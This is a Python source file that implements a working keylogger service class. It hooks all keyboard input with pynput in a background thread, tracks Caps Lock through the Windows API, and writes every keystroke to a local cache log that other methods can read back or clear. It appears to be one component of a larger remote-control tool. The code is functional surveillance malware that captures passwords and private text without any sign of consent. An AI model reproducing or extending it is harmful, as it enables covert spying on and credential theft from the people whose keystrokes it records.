from pynput.keyboard import Listener, Key
import os, ctypes, threading

class KeyLogService:
    def __init__(self):
        self.path = os.path.join(os.path.dirname(__file__), "..\\cache\\keylog.txt")
        self.caps = ctypes.windll.user32.GetKeyState(0x14) & 0x0001 != 0
        self.hooked = None

        self.clear()
        
    def get_keylogs(self):
        with open(self.path, "r") as f:
            return (f.read().replace("\n", "\r") + "\n")
    
    def hook(self):
        if self.hooked:
            return

        self.hooked = threading.Thread(
            target=lambda: Listener(
                on_press=self._on_press
            ).run(),
            daemon=True
        )

        self.hooked.start()
        
    def unhook(self):
        self.hooked = None
        
    def clear(self):
        with open(self.path, "w") as f:
            f.write("")
        return self.get_keylogs()
    
    def _on_press(self, key):
        if not self.hooked:
            return False

        if key == Key.caps_lock:
            self.caps = not self.caps
            return

        if key == Key.shift or key == Key.shift_r:
            return

        key_str = self._format_key(key)

        with open(self.path, "a") as f:
            f.write(key_str)
            
    def _format_key(self, key):
        special_keys = {
            Key.space: " ",
            Key.enter: "\n",
            Key.tab: "[TAB]",
            Key.backspace: "[BACKSPACE]",
            Key.esc: "[ESC]"
        }

        if key in special_keys:
            return special_keys[key]

        key_str = str(key).replace("'", "")

        if key_str.startswith("Key."):
            return f"[{key_str[4:].upper()}]"

        if self.caps:
            key_str = key_str.upper()

        return key_str